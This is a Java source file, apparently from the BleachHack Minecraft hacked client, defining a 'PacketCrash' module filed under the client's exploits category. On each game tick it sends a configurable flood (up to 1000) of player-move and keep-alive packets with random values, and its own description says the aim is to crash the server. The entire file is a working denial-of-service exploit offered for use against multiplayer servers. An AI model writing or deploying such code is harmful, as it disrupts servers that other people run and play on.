package bleach.hack.module.mods;

import com.google.common.eventbus.Subscribe;

import bleach.hack.event.events.EventTick;
import bleach.hack.gui.clickgui.SettingSlider;
import bleach.hack.module.Category;
import bleach.hack.module.Module;
import net.minecraft.server.network.packet.KeepAliveC2SPacket;
import net.minecraft.server.network.packet.PlayerMoveC2SPacket;

public class PlayerCrash extends Module {

	public PlayerCrash() {
        super("PacketCrash", -1, Category.EXPLOITS, "Uses cpacketplayer packets to packetify the server so it packets your packet and packs enough to crash",
                new SettingSlider("Uses: ", 1,1000,100,0));
    }
	
	@Subscribe
	public void onTick(EventTick event) {
		for(int i = 0; i < getSettings().get(0).toSlider().getValue(); i++) {
			mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket(Math.random() >= 0.5));
			mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket((int) (Math.random() * 8)));
		}
	}

}
